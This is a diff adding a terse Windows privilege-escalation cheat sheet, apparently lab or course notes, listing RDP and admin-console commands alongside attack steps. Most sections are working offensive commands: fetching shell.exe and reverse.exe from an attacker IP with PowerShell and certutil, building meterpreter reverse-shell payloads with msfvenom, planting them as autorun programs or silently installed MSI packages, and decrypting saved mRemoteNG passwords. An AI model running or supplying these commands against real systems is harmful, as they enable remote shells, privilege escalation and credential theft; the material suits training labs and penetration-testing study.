@@ -1,0 +1,61 @@
+https://github.com/sagishahar/lpeworkshop
+http://udemy.com/course/windows-privilege-escalation-for-beginners
+
+### RDP ###
+remmina
+xfreerdp /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /audio-mode:1 \
+/u:administrator /p:pass /v:$h:3389 /d:local
+lusrmgr.msc 					#local users and groups
+msconfig					#boot startup
+taskmgr						#task manager
+compmgmt					#computer managment
+msinfo32					#system info
+resmon						#resources monitor
+regedit						#registry edit
+WF.msc						#Defeder firewall
+
+
+## util ##
+net user
+icacls file.txt /grant User:F			#permission
+C:\> dir *.txt /s /a				#find file
+meterpreter> download C:\\Temp\\Tools.zip
+meterpreter> 
+
+## download ##
+curl http://IP/nc.exe -o c:\\windows\\temp\\out.exe
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.98.114:80/shell.exe','shell.exe')"
+Powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.8.98.114/shell.exe','shell.exe')"
+Powershell Invoke-WebRequest -Uri http://10.8.98.114/reverse.exe -Outfile reverse.exe
+cmd.exe /C certutil -urlcache -split -f http://10.8.98.114/program.exe Service_system_update.exe
+# smbshare
+sudo smbserver.py share . -smb2support -username user -password s3cureP@ssword
+
+
+## autorun ##
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.98.114 -f exe -o p.exe
+Powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.8.98.114/p.exe','C:\Program Files\Autorun Program\program.exe')"
+cmd.exe /C certutil -urlcache -split -f http://10.8.98.114/program.exe Service_system_update.exe
+
+
+## registry ##
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.98.114 -f msi -o s.msi
+Powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.8.98.114/s.msi','C:\Temp\setup.msi')"
+msiexec /quiet /qn /i C:\Temp\setup.msi
+
+## service ##
+Powershell > Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+# check NT AUTHORITY\INTERACTIVE right
+
+## reverse ##
+PeID => compiler / packer
+
+## nRemoteNG ##
+PS> cd %appdata%
+PS> cd mRemoteNG
+PS> cat confCons.xml
+git clone https://github.com/haseebT/mRemoteNG-Decrypt
+python mremoteng_decrypt.py -s BaSe64sTRinG==
+
